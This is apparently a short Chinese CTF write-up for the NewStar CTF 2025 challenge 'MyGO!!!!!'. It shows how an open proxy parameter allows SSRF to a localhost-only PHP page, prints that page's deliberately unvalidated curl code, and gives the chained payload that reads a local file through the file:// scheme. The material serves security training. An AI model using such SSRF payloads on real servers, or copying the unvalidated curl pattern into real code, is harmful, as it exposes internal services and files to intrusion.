---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# MyGO!!!!!

~~先演奏一下春日影~~，抓几个包，发现有一个未过滤的 proxy，可能可以打 SSRF。

![console](/assets/images/wp/2025/week3/mygo_1.png)

尝试发现只允许 http 协议

![only_http](/assets/images/wp/2025/week3/mygo_2.png)

dirsearch 扫描目录发现有 `flag.php`，直接访问 403，尝试 SSRF 访问 `/index.php?proxy=http://127.0.0.1/flag.php`

得到源码

```php
<?php
$client_ip = $_SERVER['REMOTE_ADDR'];

// 只允许本地访问
if ($client_ip !== '127.0.0.1' && $client_ip !== '::1') {
    header('HTTP/1.1 403 Forbidden');
    echo "你是外地人，我只要\"本地\"人";
    exit;
}

highlight_file(__FILE__);
if (isset($_GET['soyorin'])) {
    $url = $_GET['soyorin'];

    echo "flag在根目录";
    // 普通请求
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); // 直接输出给浏览器
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_BUFFERSIZE, 8192);
    curl_exec($ch);
    curl_close($ch);
    exit;
}

?>
```

curl 允许 file 协议，`/index.php?proxy=http://127.0.0.1/flag.php?soyorin=file:///flag` 成功拿到 flag。
